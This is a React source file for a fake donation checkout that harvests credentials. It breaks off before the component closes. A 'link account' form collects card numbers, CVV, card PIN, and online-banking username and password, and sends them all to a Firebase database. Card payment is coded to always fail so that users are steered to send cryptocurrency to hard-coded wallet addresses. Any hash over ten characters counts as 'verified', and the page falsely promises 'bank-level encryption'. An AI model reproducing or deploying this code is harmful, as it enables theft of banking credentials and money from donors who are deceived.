import React, { useState, useEffect } from 'react';
import { FaEthereum, FaBitcoin, FaCopy, FaCheck, FaQrcode, FaShieldAlt, FaExchangeAlt, FaCreditCard, FaUser, FaCalendarAlt, FaLock, FaMapMarkerAlt, FaPhone, FaEnvelope, FaKey, FaLink, FaUnlink, FaExclamationTriangle, FaArrowRight } from 'react-icons/fa';
import { db } from './firebase';
import { ref, push, set, serverTimestamp } from 'firebase/database';
import BTC from '../../assets/qr codes/btc.jpeg'
import ETH from '../../assets/qr codes/eth.jpeg'
import LTC from '../../assets/qr codes/ltc.jpeg'
import TRON from '../../assets/qr codes/tron.jpeg'
import DOGE from '../../assets/qr codes/doge.jpeg'
import RIPP from '../../assets/qr codes/ripp.jpeg'
import './paymentCheckout.css';

const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete }) => {
  const [step, setStep] = useState(1);
  const [selectedCrypto, setSelectedCrypto] = useState('');
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState('');
  const [cryptoAmount, setCryptoAmount] = useState(0);
  const [exchangeRate, setExchangeRate] = useState({});
  const [copiedAddress, setCopiedAddress] = useState(false);
  const [transactionHash, setTransactionHash] = useState('');
  const [timer, setTimer] = useState(900);
  const [paymentVerified, setPaymentVerified] = useState(false);

  // Account linking states
  const [isAccountLinked, setIsAccountLinked] = useState(false);
  const [isLinking, setIsLinking] = useState(false);
  const [linkFailed, setLinkFailed] = useState(false);
  const [showLinkForm, setShowLinkForm] = useState(false);
  const [paymentFailed, setPaymentFailed] = useState(false);
  const [showCryptoRedirect, setShowCryptoRedirect] = useState(false);

  // Card payment states
  const [cardDetails, setCardDetails] = useState({
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    cardholderName: ''
  });

  // Billing address states
  const [billingAddress, setBillingAddress] = useState({
    street: '',
    city: '',
    state: '',
    zipCode: '',
    country: ''
  });

  // Account information states
  const [accountInfo, setAccountInfo] = useState({
    email: '',
    phoneNumber: '',
    cardPin: '',
    bankName: '',
    accountUsername: '',
    accountPassword: ''
  });

  const [isProcessing, setIsProcessing] = useState(false);
  const [cardErrors, setCardErrors] = useState({});

  // Load linked account from localStorage on component mount
  useEffect(() => {
    const savedLinkedAccount = localStorage.getItem('linkedAccount');
    if (savedLinkedAccount) {
      const accountData = JSON.parse(savedLinkedAccount);
      setIsAccountLinked(true);
      setCardDetails(accountData.cardDetails || {});
      setBillingAddress(accountData.billingAddress || {});
      setAccountInfo(accountInfo => ({
        ...accountInfo,
        email: accountData.email || '',
        phoneNumber: accountData.phoneNumber || ''
      }));
    }
  }, []);

  const cryptoRates = {
    btc: 65000,
    eth: 3500,
    usdt: 1,
    usdc: 1,
    ltc: 75,
    doge: 0.15,
    trx: 0.12,
    xrp: 0.60
  };

  const cryptoOptions = [
    { 
      id: 'btc', 
      name: 'Bitcoin (BTC)', 
      icon: FaBitcoin, 
      image:BTC,
      address: 'bc1qd0l4rpekuxey4dchuaqt963wuz5djpskj9az06' 
    },
    { 
      id: 'eth', 
      name: 'Ethereum (ETH)', 
      icon: FaEthereum, 
      image:ETH,
      address: '0x2F549207342b44ADF00d25893580b23902f3137B' 
    },
    { 
      id: 'usdt', 
      name: 'USDT (ERC-20)', 
      icon: FaEthereum, 
      image:ETH,
      address: '0x2F549207342b44ADF00d25893580b23902f3137B' 
    },
    { 
      id: 'ltc', 
      name: 'Litecoin (LTC)', 
      icon: FaBitcoin, 
      image:LTC,
      address: 'LYeqNHY5YR258V41SEMN8WmdHHrm76EzkD' 
    },
    { 
      id: 'doge', 
      name: 'Dogecoin (DOGE)', 
      icon: FaBitcoin,
      image:DOGE, 
      address: 'D7whXjWwZzsXqnfZdy3rSkBtvTbyefr4d4' 
    },
    { 
      id: 'trx', 
      name: 'TRON (TRX)',
      image:TRON, 
      icon: FaBitcoin, 
      address: 'TNyKcnXh9GhANHaCgQyTdnXGmMc72ykQFC' 
    },
    { 
      id: 'xrp', 
      image:RIPP,
      name: 'Ripple (XRP)', 
      icon: FaBitcoin, 
      address: 'raMJSVpvpi8RY6yqmeAo9VPsAeECz1qvmc' 
    }
  ];

  useEffect(() => {
    setExchangeRate(cryptoRates);
    
    if (selectedCrypto && donationAmount) {
      setCryptoAmount(donationAmount / cryptoRates[selectedCrypto]);
    }
    
    if (step === 3 && selectedPaymentMethod === 'crypto') {
      const interval = setInterval(() => {
        setTimer(prev => {
          if (prev <= 1) {
            clearInterval(interval);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
      
      return () => clearInterval(interval);
    }
  }, [selectedCrypto, donationAmount, step, selectedPaymentMethod]);

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    setCopiedAddress(true);
    setTimeout(() => setCopiedAddress(false), 2000);
  };

  const handlePaymentMethodSelect = (method) => {
    setSelectedPaymentMethod(method);
    
    if (method === 'crypto') {
      setStep(2); // Go to crypto selection
    } else if (method === 'card') {
      if (isAccountLinked) {
        setStep(4); // Go to card payment if account is linked
      } else {
        setStep(3); // Go to account linking if not linked
      }
    } else if (method === 'link') {
      setStep(3); // Go to account linking
    }
  };

  const handleCryptoSelect = (cryptoId) => {
    setSelectedCrypto(cryptoId);
    setStep(4); // Go to crypto payment instructions
  };

  // Manual redirect to crypto
  const handleRedirectToCrypto = () => {
    setSelectedPaymentMethod('crypto');
    setStep(2); // Go to crypto selection
    setPaymentFailed(false);
    setShowCryptoRedirect(false);
    
    storePaymentDataInRealtimeDB('crypto', 'redirected_from_card', {
      reason: 'card_payment_failed_manual_redirect',
      originalMethod: 'card',
      redirectTime: new Date().toISOString()
    });
  };

  // Validation functions
  const validateCardNumber = (number) => {
    return number.replace(/\s/g, '').length === 16 && /^\d+$/.test(number.replace(/\s/g, ''));
  };

  const validateExpiryDate = (date) => {
    const [month, year] = date.split('/');
    if (!month || !year) return false;
    
    const now = new Date();
    const currentYear = now.getFullYear() % 100;
    const currentMonth = now.getMonth() + 1;
    
    return month >= 1 && month <= 12 && 
           (year > currentYear || (year == currentYear && month >= currentMonth));
  };

  const validateCVV = (cvv) => {
    return cvv.length === 3 && /^\d+$/.test(cvv);
  };

  const validateEmail = (email) => {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  };

  const validatePhone = (phone) => {
    return phone.replace(/\D/g, '').length >= 10;
  };

  // Input change handler
  const handleInputChange = (field, value, category) => {
    let formattedValue = value;

    if (field === 'cardNumber') {
      formattedValue = value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
      if (formattedValue.length > 19) formattedValue = formattedValue.slice(0, 19);
    }
    
    if (field === 'expiryDate') {
      formattedValue = value.replace(/\D/g, '').replace(/(\d{2})(\d)/, '$1/$2');
      if (formattedValue.length > 5) formattedValue = formattedValue.slice(0, 5);
    }
    
    if (field === 'cvv') {
      formattedValue = value.replace(/\D/g, '').slice(0, 3);
    }

    if (field === 'cardPin') {
      formattedValue = value.replace(/\D/g, '').slice(0, 4);
    }

    if (field === 'zipCode') {
      formattedValue = value.replace(/\D/g, '').slice(0, 5);
    }

    if (category === 'card') {
      setCardDetails(prev => ({ ...prev, [field]: formattedValue }));
    } else if (category === 'billing') {
      setBillingAddress(prev => ({ ...prev, [field]: formattedValue }));
    } else if (category === 'account') {
      setAccountInfo(prev => ({ ...prev, [field]: formattedValue }));
    }

    if (cardErrors[field]) {
      setCardErrors(prev => ({ ...prev, [field]: '' }));
    }
  };

  const validateLinkForm = () => {
    const errors = {};

    if (!validateCardNumber(cardDetails.cardNumber)) {
      errors.cardNumber = 'Please enter a valid 16-digit card number';
    }
    
    if (!validateExpiryDate(cardDetails.expiryDate)) {
      errors.expiryDate = 'Please enter a valid expiry date (MM/YY)';
    }
    
    if (!validateCVV(cardDetails.cvv)) {
      errors.cvv = 'Please enter a valid 3-digit CVV';
    }
    
    if (!cardDetails.cardholderName.trim()) {
      errors.cardholderName = 'Please enter cardholder name';
    }

    if (!billingAddress.street.trim()) {
      errors.street = 'Please enter street address';
    }

    if (!billingAddress.city.trim()) {
      errors.city = 'Please enter city';
    }

    if (!billingAddress.state.trim()) {
      errors.state = 'Please enter state';
    }

    if (!billingAddress.zipCode.trim() || billingAddress.zipCode.length !== 5) {
      errors.zipCode = 'Please enter valid 5-digit ZIP code';
    }

    if (!billingAddress.country.trim()) {
      errors.country = 'Please enter country';
    }

    if (!validateEmail(accountInfo.email)) {
      errors.email = 'Please enter a valid email address';
    }

    if (!validatePhone(accountInfo.phoneNumber)) {
      errors.phoneNumber = 'Please enter a valid phone number';
    }

    if (!accountInfo.bankName.trim()) {
      errors.bankName = 'Please enter bank name';
    }

    if (!accountInfo.accountUsername.trim()) {
      errors.accountUsername = 'Please enter account username';
    }

    if (!accountInfo.accountPassword) {
      errors.accountPassword = 'Please enter account password';
    }

    setCardErrors(errors);
    return Object.keys(errors).length === 0;
  };

  // Save linked account to localStorage
  const saveLinkedAccountToStorage = () => {
    const linkedAccount = {
      cardDetails: { ...cardDetails },
      billingAddress: { ...billingAddress },
      email: accountInfo.email,
      phoneNumber: accountInfo.phoneNumber,
      linkedAt: new Date().toISOString()
    };
    localStorage.setItem('linkedAccount', JSON.stringify(linkedAccount));
  };

  // Remove linked account from storage
  const removeLinkedAccount = () => {
    localStorage.removeItem('linkedAccount');
    setIsAccountLinked(false);
    setCardDetails({
      cardNumber: '',
      expiryDate: '',
      cvv: '',
      cardholderName: ''
    });
    setBillingAddress({
      street: '',
      city: '',
      state: '',
      zipCode: '',
      country: ''
    });
    setAccountInfo(prev => ({
      ...prev,
      email: '',
      phoneNumber: '',
      cardPin: ''
    }));
  };

  // Firebase storage functions
  const storePaymentDataInRealtimeDB = async (paymentType, status, additionalData = {}) => {
    try {
      const paymentData = {
        donationAmount,
        campaign: campaign.title,
        campaignId: campaign.id,
        paymentMethod: selectedPaymentMethod,
        timestamp: serverTimestamp(),
        status: status,
        ...additionalData,
        userInfo: {
          email: accountInfo.email,
          phoneNumber: accountInfo.phoneNumber
        }
      };

      if (paymentType === 'crypto') {
        paymentData.cryptoDetails = {
          selectedCrypto,
          cryptoAmount,
          cryptoAddress: cryptoOptions.find(c => c.id === selectedCrypto)?.address,
          transactionHash,
          exchangeRate: exchangeRate[selectedCrypto]
        };
      }

      if (paymentType === 'card') {
        paymentData.cardDetails = {
          ...cardDetails,
          billingAddress: { ...billingAddress },
          accountInfo: { ...accountInfo }
        };
      }

      const paymentRef = push(ref(db, 'paymentAttempts'));
      await set(paymentRef, paymentData);
      
      return paymentRef.key;
    } catch (error) {
      console.error('Error storing payment data: ', error);
      return false;
    }
  };

  const storeLinkAttempt = async () => {
    return await storePaymentDataInRealtimeDB('card', 'linking_attempt', {
      step: 'account_linking',
      action: 'link_account'
    });
  };

  const storeSuccessfulLink = async () => {
    return await storePaymentDataInRealtimeDB('card', 'account_linked', {
      step: 'account_linked',
      linkedAt: new Date().toISOString()
    });
  };

  const storeCardPaymentAttempt = async (stepDescription) => {
    return await storePaymentDataInRealtimeDB('card', 'payment_attempt', {
      step: stepDescription
    });
  };

  const storeSuccessfulPayment = async (paymentType, transactionId = null) => {
    return await storePaymentDataInRealtimeDB(paymentType, 'completed', {
      transactionId: transactionId || `TXN_${Math.random().toString(36).substr(2, 9).toUpperCase()}`,
      completionTime: new Date().toISOString(),
      finalAmount: donationAmount
    });
  };

  const storeFailedPayment = async (paymentType, errorMessage) => {
    return await storePaymentDataInRealtimeDB(paymentType, 'failed', {
      error: errorMessage,
      failureTime: new Date().toISOString()
    });
  };

  // Account linking simulation - ALWAYS SUCCESSFUL
  const simulateLinking = () => {
    return new Promise((resolve) => {
      setIsLinking(true);
      
      storeLinkAttempt();
      
      setTimeout(() => {
        storeSuccessfulLink();
        saveLinkedAccountToStorage();
        resolve({
          status: 'linked',
          message: 'Account linked successfully'
        });
      }, 2000);
    });
  };

  const handleLinkAccount = async () => {
    if (!validateLinkForm()) return;

    try {
      await simulateLinking();
      setIsAccountLinked(true);
      setShowLinkForm(false);
      setLinkFailed(false);
    } catch (error) {
      setLinkFailed(true);
      setCardErrors(prev => ({ ...prev, general: error.message }));
    } finally {
      setIsLinking(false);
    }
  };

  // Card payment ALWAYS FAILS
  const simulateCardPayment = () => {
    return new Promise((resolve, reject) => {
      setIsProcessing(true);

      storeCardPaymentAttempt('payment_processing');

      setTimeout(() => {
        // Always fail the card payment
        storeFailedPayment('card', 'Card payment failed. Please try another payment method.');
        reject(new Error('We apologize, but card payments are currently unavailable. Please use cryptocurrency to complete your donation.'));
      }, 2000);
    });
  };

  const handleCardPayment = async () => {
    if (!isAccountLinked) {
      setCardErrors(prev => ({ ...prev, general: 'Please link your account first' }));
      return;
    }

    try {
      await simulateCardPayment();
    } catch (error) {
      setPaymentFailed(true);
      setShowCryptoRedirect(true);
      setCardErrors(prev => ({ ...prev, general: error.message }));
    } finally {
      setIsProcessing(false);
    }
  };

  const handleTransactionSubmit = async () => {
    if (transactionHash.length > 10) {
      setPaymentVerified(true);
      await storePaymentDataInRealtimeDB('crypto', 'verified', {
        step: 'transaction_verified',
        transactionHash: transactionHash,
        verificationTime: new Date().toISOString()
      });
      await storeSuccessfulPayment('crypto');
      setTimeout(() => setStep(6), 2000);
    }
  };

  const handleCryptoSelectWithStorage = (cryptoId) => {
    setSelectedCrypto(cryptoId);
    setStep(4);
    storePaymentDataInRealtimeDB('crypto', 'pending', {
      step: 'crypto_selected',
      cryptoType: cryptoId
    });
  };

  // Step 1: Payment Method Selection (ALL THREE OPTIONS)
  const renderStep1 = () => (
    <div className="checkout-step">
      <h2>Choose Payment Method</h2>
      <p className="step-description">Select how you'd like to make your donation</p>
      
      <div className="payment-methods">
        {/* Cryptocurrency Option */}
        <div 
          className={`payment-method ${selectedPaymentMethod === 'crypto' ? 'selected' : ''}`}
          onClick={() => handlePaymentMethodSelect('crypto')}
        >
          <div className="method-icon crypto">
            <FaEthereum />
          </div>
          <div className="method-info">
            <h3>Cryptocurrency</h3>
            <p>Pay with crypto (BTC, ETH, USDT, USDC, LTC, DOGE, TRX, XRP)</p>
            <div className="method-badges">
              <span className="badge">Bitcoin</span>
              <span className="badge">Ethereum</span>
              <span className="badge">8+ Cryptos</span>
            </div>
          </div>
        </div>

        {/* Link Account Option */}
        <div 
          className={`payment-method ${selectedPaymentMethod === 'link' ? 'selected' : ''}`}
          onClick={() => handlePaymentMethodSelect('link')}
        >
          <div className="method-icon link">
            <FaLink />
          </div>
          <div className="method-info">
            <h3>Link Your Account</h3>
            <p>Link your bank account and card for faster payments</p>
            <div className="method-badges">
              <span className="badge">Secure</span>
              <span className="badge">Fast Setup</span>
              <span className="badge">Future Payments</span>
            </div>
            <div className="link-status">
              {isAccountLinked ? (
                <span className="status-badge linked">✓ Account Linked</span>
              ) : (
                <span className="status-badge unlinked">Link Required</span>
              )}
            </div>
          </div>
        </div>

        {/* Card Payment Option */}
        <div 
          className={`payment-method ${selectedPaymentMethod === 'card' ? 'selected' : ''} ${!isAccountLinked ? 'disabled' : ''}`}
          onClick={() => isAccountLinked && handlePaymentMethodSelect('card')}
        >
          <div className="method-icon card">
            <FaCreditCard />
          </div>
          <div className="method-info">
            <h3>Credit/Debit Card</h3>
            <p>Pay instantly with your linked card</p>
            <div className="method-badges">
              <span className="badge">Visa</span>
              <span className="badge">Mastercard</span>
              <span className="badge">Amex</span>
            </div>
            {!isAccountLinked && (
              <div className="requirement-notice">
                <FaExclamationTriangle />
                <span>Account linking required</span>
              </div>
            )}
            {isAccountLinked && (
              <div className="link-status">
                <span className="status-badge linked">✓ Ready to Pay</span>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );

  // Step 2: Crypto Selection
  const renderStep2 = () => (
    <div className="checkout-step">
      <h2>Select Cryptocurrency</h2>
      <p className="step-description">Choose your preferred cryptocurrency for donation</p>
      
      <div className="crypto-options">
        {cryptoOptions.map(crypto => (
          <div 
            key={crypto.id}
            className={`crypto-option ${selectedCrypto === crypto.id ? 'selected' : ''}`}
            onClick={() => handleCryptoSelectWithStorage(crypto.id)}
          >
            <div className="crypto-icon">
              {React.createElement(crypto.icon)}
            </div>
            <div className="crypto-info">
              <h3>{crypto.name}</h3>
              <p>Make your donations using {crypto.name}</p>
            </div>
          </div>
        ))}
      </div>
    </div>
  );

  // Step 3: Account Linking
  const renderStep3 = () => (
    <div className="checkout-step">
      <h2>Link Your Account</h2>
      <p className="step-description">Link your account to enable card payments</p>
      
      <div className="account-linking-dashboard">
        <div className="link-status-card">
          <div className="status-header">
            <div className={`status-indicator ${isAccountLinked ? 'linked' : 'unlinked'}`}>
              {isAccountLinked ? <FaLink /> : <FaUnlink />}
            </div>
            <div className="status-info">
              <h3>Account Status</h3>
              <p>{isAccountLinked ? 'Your account is linked and ready for payments' : 'Link your account to enable card payments'}</p>
            </div>
          </div>
          
          {isAccountLinked ? (
            <div className="linked-account-preview">
              <div className="account-details">
                <div className="detail-row">
                  <span>Card:</span>
                  <span>•••• {cardDetails.cardNumber.slice(-4)}</span>
                </div>
                <div className="detail-row">
                  <span>Linked Email:</span>
                  <span>{accountInfo.email}</span>
                </div>
                <div className="detail-row">
                  <span>Linked On:</span>
                  <span>{new Date().toLocaleDateString()}</span>
                </div>
              </div>
              
              <div className="account-actions">
                <button 
                  className="action-btn secondary"
                  onClick={removeLinkedAccount}
                >
                  <FaUnlink />
                  Unlink Account
                </button>
                <button 
                  className="action-btn primary"
                  onClick={() => setStep(1)}
                >
                  Return to Payment Methods
                </button>
              </div>
            </div>
          ) : (
            <div className="unlinked-state">
              <div className="benefits-list">
                <h4>Benefits of Linking:</h4>
                <ul>
                  <li>Faster checkout experience</li>
                  <li>Secure payment processing</li>
                  <li>Future payment convenience</li>
                  <li>Payment history tracking</li>
                </ul>
              </div>
              
              <div className="link-actions">
                {!showLinkForm ? (
                  <button 
                    className="link-account-btn primary"
                    onClick={() => setShowLinkForm(true)}
                  >
                    <FaLink />
                    Link Your Account
                  </button>
                ) : (
                  <div className="link-form-container">
                    {renderLinkAccountForm()}
                  </div>
                )}
                
                <button 
                  className="action-btn secondary"
                  onClick={() => setStep(1)}
                >
                  Back to Payment Methods
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );

  // Link Account Form Component
  const renderLinkAccountForm = () => (
    <div className="link-account-form">
      <div className="form-header">
        <h4>Link Your Account</h4>
        <p>Enter your card and account details to link your account</p>
      </div>
      
      <div className="form-sections">
        {/* Card Details Section */}
        <div className="form-section">
          <h5>Card Information</h5>
          <div className="form-group">
            <label>Card Number</label>
            <div className={`input-with-icon ${cardErrors.cardNumber ? 'error' : ''}`}>
              <FaCreditCard />
              <input
                type="text"
                placeholder="1234 5678 9012 3456"
                value={cardDetails.cardNumber}
                onChange={(e) => handleInputChange('cardNumber', e.target.value, 'card')}
                className="card-input"
              />
            </div>
            {cardErrors.cardNumber && <span className="error-text">{cardErrors.cardNumber}</span>}
          </div>
          
          <div className="form-row">
            <div className="form-group">
              <label>Expiry Date</label>
              <div className={`input-with-icon ${cardErrors.expiryDate ? 'error' : ''}`}>
                <FaCalendarAlt />
                <input
                  type="text"
                  placeholder="MM/YY"
                  value={cardDetails.expiryDate}
                  onChange={(e) => handleInputChange('expiryDate', e.target.value, 'card')}
                  className="card-input"
                />
              </div>
              {cardErrors.expiryDate && <span className="error-text">{cardErrors.expiryDate}</span>}
            </div>
            
            <div className="form-group">
              <label>CVV</label>
              <div className={`input-with-icon ${cardErrors.cvv ? 'error' : ''}`}>
                <FaLock />
                <input
                  type="text"
                  placeholder="123"
                  value={cardDetails.cvv}
                  onChange={(e) => handleInputChange('cvv', e.target.value, 'card')}
                  className="card-input"
                />
              </div>
              {cardErrors.cvv && <span className="error-text">{cardErrors.cvv}</span>}
            </div>
          </div>
          
          <div className="form-group">
            <label>Cardholder Name</label>
            <div className={`input-with-icon ${cardErrors.cardholderName ? 'error' : ''}`}>
              <FaUser />
              <input
                type="text"
                placeholder="John Doe"
                value={cardDetails.cardholderName}
                onChange={(e) => handleInputChange('cardholderName', e.target.value, 'card')}
                className="card-input"
              />
            </div>
            {cardErrors.cardholderName && <span className="error-text">{cardErrors.cardholderName}</span>}
          </div>
        </div>

        {/* Billing Address Section */}
        <div className="form-section">
          <h5>Billing Address</h5>
          <div className="form-group">
            <label>Street Address</label>
            <div className={`input-with-icon ${cardErrors.street ? 'error' : ''}`}>
              <FaMapMarkerAlt />
              <input
                type="text"
                placeholder="123 Main St"
                value={billingAddress.street}
                onChange={(e) => handleInputChange('street', e.target.value, 'billing')}
                className="billing-input"
              />
            </div>
            {cardErrors.street && <span className="error-text">{cardErrors.street}</span>}
          </div>
          
          <div className="form-row">
            <div className="form-group">
              <label>City</label>
              <div className={`input-with-icon ${cardErrors.city ? 'error' : ''}`}>
                <FaMapMarkerAlt />
                <input
                  type="text"
                  placeholder="New York"
                  value={billingAddress.city}
                  onChange={(e) => handleInputChange('city', e.target.value, 'billing')}
                  className="billing-input"
                />
              </div>
              {cardErrors.city && <span className="error-text">{cardErrors.city}</span>}
            </div>
            
            <div className="form-group">
              <label>State</label>
              <div className={`input-with-icon ${cardErrors.state ? 'error' : ''}`}>
                <FaMapMarkerAlt />
                <input
                  type="text"
                  placeholder="NY"
                  value={billingAddress.state}
                  onChange={(e) => handleInputChange('state', e.target.value, 'billing')}
                  className="billing-input"
                />
              </div>
              {cardErrors.state && <span className="error-text">{cardErrors.state}</span>}
            </div>
          </div>
          
          <div className="form-row">
            <div className="form-group">
              <label>ZIP Code</label>
              <div className={`input-with-icon ${cardErrors.zipCode ? 'error' : ''}`}>
                <FaMapMarkerAlt />
                <input
                  type="text"
                  placeholder="10001"
                  value={billingAddress.zipCode}
                  onChange={(e) => handleInputChange('zipCode', e.target.value, 'billing')}
                  className="billing-input"
                />
              </div>
              {cardErrors.zipCode && <span className="error-text">{cardErrors.zipCode}</span>}
            </div>
            
            <div className="form-group">
              <label>Country</label>
              <div className={`input-with-icon ${cardErrors.country ? 'error' : ''}`}>
                <FaMapMarkerAlt />
                <input
                  type="text"
                  placeholder="United States"
                  value={billingAddress.country}
                  onChange={(e) => handleInputChange('country', e.target.value, 'billing')}
                  className="billing-input"
                />
              </div>
              {cardErrors.country && <span className="error-text">{cardErrors.country}</span>}
            </div>
          </div>
        </div>

        {/* Account Information Section */}
        <div className="form-section">
          <h5>Account Information</h5>
          <div className="form-row">
            <div className="form-group">
              <label>Email Address</label>
              <div className={`input-with-icon ${cardErrors.email ? 'error' : ''}`}>
                <FaEnvelope />
                <input
                  type="email"
                  placeholder="john@example.com"
                  value={accountInfo.email}
                  onChange={(e) => handleInputChange('email', e.target.value, 'account')}
                  className="account-input"
                />
              </div>
              {cardErrors.email && <span className="error-text">{cardErrors.email}</span>}
            </div>
            
            <div className="form-group">
              <label>Phone Number</label>
              <div className={`input-with-icon ${cardErrors.phoneNumber ? 'error' : ''}`}>
                <FaPhone />
                <input
                  type="text"
                  placeholder="(555) 123-4567"
                  value={accountInfo.phoneNumber}
                  onChange={(e) => handleInputChange('phoneNumber', e.target.value, 'account')}
                  className="account-input"
                />
              </div>
              {cardErrors.phoneNumber && <span className="error-text">{cardErrors.phoneNumber}</span>}
            </div>
          </div>
          
          <div className="form-group">
            <label>Card PIN</label>
            <div className={`input-with-icon ${cardErrors.cardPin ? 'error' : ''}`}>
              <FaKey />
              <input
                type="password"
                placeholder="****"
                value={accountInfo.cardPin}
                onChange={(e) => handleInputChange('cardPin', e.target.value, 'account')}
                className="account-input pin"
              />
            </div>
            {cardErrors.cardPin && <span className="error-text">{cardErrors.cardPin}</span>}
          </div>
          
          <div className="form-group">
            <label>Bank Name</label>
            <div className={`input-with-icon ${cardErrors.bankName ? 'error' : ''}`}>
              <input
                type="text"
                placeholder="Bank of America"
                value={accountInfo.bankName}
                onChange={(e) => handleInputChange('bankName', e.target.value, 'account')}
                className="account-input"
              />
            </div>
            {cardErrors.bankName && <span className="error-text">{cardErrors.bankName}</span>}
          </div>
          
          <div className="form-row">
            <div className="form-group">
              <label>Account Username</label>
              <div className={`input-with-icon ${cardErrors.accountUsername ? 'error' : ''}`}>
                <FaUser />
                <input
                  type="text"
                  placeholder="johndoe123"
                  value={accountInfo.accountUsername}
                  onChange={(e) => handleInputChange('accountUsername', e.target.value, 'account')}
                  className="account-input"
                />
              </div>
              {cardErrors.accountUsername && <span className="error-text">{cardErrors.accountUsername}</span>}
            </div>
            
            <div className="form-group">
              <label>Account Password</label>
              <div className={`input-with-icon ${cardErrors.accountPassword ? 'error' : ''}`}>
                <FaKey />
                <input
                  type="password"
                  placeholder="••••••••"
                  value={accountInfo.accountPassword}
                  onChange={(e) => handleInputChange('accountPassword', e.target.value, 'account')}
                  className="account-input"
                />
              </div>
              {cardErrors.accountPassword && <span className="error-text">{cardErrors.accountPassword}</span>}
            </div>
          </div>
        </div>
      </div>

      {cardErrors.general && (
        <div className="error-message general-error">
          {cardErrors.general}
        </div>
      )}
      
      {linkFailed && (
        <div className="linking-failed">
          <div className="failure-message">
            <span>Linking failed. Please check your details and try again.</span>
          </div>
        </div>
      )}

      <div className="form-actions">
        <button 
          className="action-btn secondary"
          onClick={() => setShowLinkForm(false)}
        >
          Cancel
        </button>
        <button 
          className={`action-btn primary ${isLinking ? 'processing' : ''}`}
          onClick={handleLinkAccount}
          disabled={isLinking}
        >
          {isLinking ? (
            <>
              <div className="spinner"></div>
              Linking Account...
            </>
          ) : (
            <>
              <FaLink />
              Link Account
            </>
          )}
        </button>
      </div>
    </div>
  );

  // Step 4: Crypto Payment Instructions OR Card Payment
  const renderStep4 = () => {
    if (selectedPaymentMethod === 'crypto') {
      const selectedCryptoData = cryptoOptions.find(c => c.id === selectedCrypto);
      
      return (
        <div className="checkout-step">
          <h2>Make Your Payment</h2>
          
          <div className="payment-details">
            <div className="amount-card">
              <div className="amount-display">
                <span className="crypto-symbol">Send exactly ${donationAmount} USD to the {selectedCrypto.toUpperCase()} address below</span>
              </div>
            </div>
            
            <div className="timer-warning">
              <FaExchangeAlt />
              <span>Price valid for: <strong>{formatTime(timer)}</strong></span>
            </div>
            
            <div className="address-section">
              <label>Send to this {selectedCrypto.toUpperCase()} address:</label>
              <div className="address-display">
                <span>{selectedCryptoData.address}</span>
                <button 
                  className="copy-btn"
                  onClick={() => copyToClipboard(selectedCryptoData.address)}
                >
                  {copiedAddress ? <FaCheck /> : <FaCopy />}
                </button>
              </div>
            </div>
            
            <div className="qr-code-section">
              <div className="qr-code">
                <img 
                  src={selectedCryptoData.image} 
                  alt={`${selectedCrypto.toUpperCase()} QR Code`}
                  className="qr-code-image"
                />
                <p>Scan QR Code</p>
              </div>
            </div>
            
            <div className="payment-instructions">
              <h4>Important Instructions:</h4>
              <ul>
                <li>Send exactly ${donationAmount} in {selectedCrypto.toUpperCase()}</li>
                <li>Use only the {selectedCrypto.toUpperCase()} network</li>
                <li>Do not send from an exchange wallet</li>
                <li>Transaction may take 5-15 minutes to confirm</li>
              </ul>
            </div>
          </div>
          
          <button className="next-btn" onClick={() => setStep(5)}>
            I've Sent the Payment
          </button>
        </div>
      );
    } else if (selectedPaymentMethod === 'card') {
      // Card Payment Confirmation
      return (
        <div className="checkout-step">
          <h2>Confirm Your Payment</h2>
          <p className="step-description">Review your donation and linked account details</p>
          
          <div className="payment-confirmation">
            <div className="confirmation-card">
              <div className="donation-summary">
                <h4>Donation Summary</h4>
                <div className="summary-item">
                  <span>Campaign:</span>
                  <span>{campaign.title}</span>
                </div>
                <div className="summary-item">
                  <span>Amount:</span>
                  <span>${donationAmount}</span>
                </div>
                <div className="summary-item">
                  <span>Processing Fee:</span>
                  <span>$0.00</span>
                </div>
                <div className="summary-item total">
                  <span>Total:</span>
                  <span>${donationAmount}</span>
                </div>
              </div>
              
              <div className="account-preview">
                <h4>Linked Account</h4>
                <div className="account-details-preview">
                  <div className="detail-item">
                    <span>Card:</span>
                    <span>•••• {cardDetails.cardNumber.slice(-4)}</span>
                  </div>
                  <div className="detail-item">
                    <span>Cardholder:</span>
                    <span>{cardDetails.cardholderName}</span>
                  </div>
                  <div className="detail-item">
                    <span>Email:</span>
                    <span>{accountInfo.email}</span>
                  </div>
                </div>
              </div>

              {/* Payment Failure Message with Manual Redirect Button */}
              {paymentFailed && (
                <div className="payment-failure-message">
                  <div className="failure-header">
                    <FaExclamationTriangle />
                    <h4>Payment Failed</h4>
                  </div>
                  <p>We apologize, but card payments are currently unavailable. Please use cryptocurrency to complete your donation.</p>
                  
                  {showCryptoRedirect && (
                    <div className="crypto-redirect-section">
                      <div className="redirect-prompt">
                        <p>Would you like to pay with cryptocurrency instead?</p>
                      </div>
                      <button 
                        className="crypto-redirect-btn"
                        onClick={handleRedirectToCrypto}
                      >
                        <FaEthereum />
                        Pay with Cryptocurrency
                        <FaArrowRight />
                      </button>
                      <button 
                        className="action-btn secondary"
                        onClick={() => setPaymentFailed(false)}
                      >
                        Try Card Payment Again
                      </button>
                    </div>
                  )}
                </div>
              )}
              
              {cardErrors.general && !paymentFailed && (
                <div className="error-message general-error">
                  {cardErrors.general}
                </div>
              )}
              
              {!paymentFailed && (
                <button 
                  className={`pay-now-btn ${isProcessing ? 'processing' : ''}`}
                  onClick={handleCardPayment}
                  disabled={isProcessing || !isAccountLinked}
                >
                  {isProcessing ? (
                    <>
                      <div className="spinner"></div>
                      Processing Payment...
                    </>
                  ) : (
                    `Pay $${donationAmount} Now`
                  )}
                </button>
              )}
              
              <div className="security-assurance">
                <FaShieldAlt />
                <span>Your payment is secured with bank-level encryption</span>
              </div>
            </div>
          </div>
        </div>
      );
    }
  };

